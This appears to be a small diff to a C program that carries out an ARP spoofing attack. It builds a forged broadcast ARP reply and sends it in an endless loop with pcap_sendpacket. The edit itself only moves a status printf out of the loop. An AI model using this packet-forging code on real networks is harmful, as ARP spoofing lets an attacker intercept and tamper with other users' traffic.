@@ -93,7 +93,6 @@ int main(int argc, char* argv[]){
 	}
 		
 	//Preparing ARP Spoof Attack
-
 	memset(packet, 0, 100);
 	memset(ether.ether_dhost, 0xff, 6); //Broadcast
 	arp.opcode=htons(0x2); //Response
@@ -103,8 +102,8 @@ int main(int argc, char* argv[]){
 	memcpy(packet, &ether, sizeof(ether));
 	memcpy(packet+sizeof(ether), &arp, sizeof(arp));
 
+	printf("ARP Spoofind in progress. Press CTRL+C to cancel.\n");
 	while(1){
-		printf("ARP Spoofind in progress. Press CTRL+C to cancel.\n");
 		pcap_sendpacket(handle, packet, sizeof(ether)+sizeof(arp));
 	}
 	
